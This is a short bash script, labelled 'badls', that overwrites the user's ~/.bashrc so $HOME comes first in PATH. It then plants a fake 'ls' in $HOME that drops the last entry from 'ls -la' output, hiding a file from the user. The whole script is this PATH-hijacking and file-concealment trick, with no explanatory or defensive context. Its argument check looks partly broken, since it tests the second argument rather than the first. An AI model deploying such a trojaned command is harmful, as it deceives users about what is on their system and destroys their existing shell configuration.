#!/bin/bash
# Add $HOME to start of path
echo $PATH | tr -d '"' | { read P; echo "export PATH=\"$HOME:$P\""; } > ~/.bashrc
# create badls file
echo "if [ \"\$2\" == "-la" ] || [ \"\$2\" == \"-al\" ]; then /usr/bin/ls -la | wc -l | { read num; ((num -= 1)); /usr/bin/ls -la --color=always | head -n \$num;}; else /usr/bin/ls \$*; fi" > $HOME/ls